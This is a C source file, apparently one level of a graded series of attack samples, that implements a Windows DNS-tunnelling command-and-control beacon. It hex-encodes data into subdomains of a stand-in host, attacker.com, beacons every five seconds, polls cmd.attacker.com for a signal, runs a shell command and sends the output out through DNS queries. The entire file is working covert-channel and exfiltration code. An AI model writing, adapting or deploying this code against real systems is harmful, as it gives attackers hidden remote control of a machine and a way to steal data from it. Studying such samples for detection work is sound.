// Windows port of level7_DNS_TunnelReverseShell
// DNS tunneling for covert C2 communication

#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>

void dns_exfiltrate(char *data) {
    char query[256];
    char encoded[128] = {0};
    struct addrinfo hints, *result = NULL;

    // Simple hex encoding
    for(int i = 0; data[i] && i < 60; i++) {
        sprintf(encoded + (i*2), "%02x", (unsigned char)data[i]);
    }

    // Create DNS query subdomain
    snprintf(query, sizeof(query), "%s.attacker.com", encoded);

    // Trigger DNS lookup (exfiltration via DNS query)
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    getaddrinfo(query, "80", &hints, &result);

    if (result != NULL) {
        freeaddrinfo(result);
    }
}

int main() {
    WSADATA wsa;
    char buffer[1024];
    FILE *fp;
    struct addrinfo hints, *result = NULL;

    // Initialize WinSock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        return 1;
    }

    while(1) {
        // Beacon via DNS
        dns_exfiltrate("beacon");

        // Sleep for 5 seconds
        Sleep(5000);

        // Check for commands via DNS lookup
        ZeroMemory(&hints, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;

        int result_code = getaddrinfo("cmd.attacker.com", "80", &hints, &result);
        if(result_code == 0 && result != NULL) {
            // Execute command (simplified - just run dir)
            fp = _popen("dir", "r");
            if (fp) {
                char output[1024] = {0};
                size_t bytes_read = fread(output, 1, sizeof(output) - 1, fp);
                _pclose(fp);

                if (bytes_read > 0) {
                    output[bytes_read] = '\0';
                    // Exfiltrate command output via DNS
                    dns_exfiltrate(output);
                }
            }

            freeaddrinfo(result);
        }
    }

    WSACleanup();
    return 0;
}
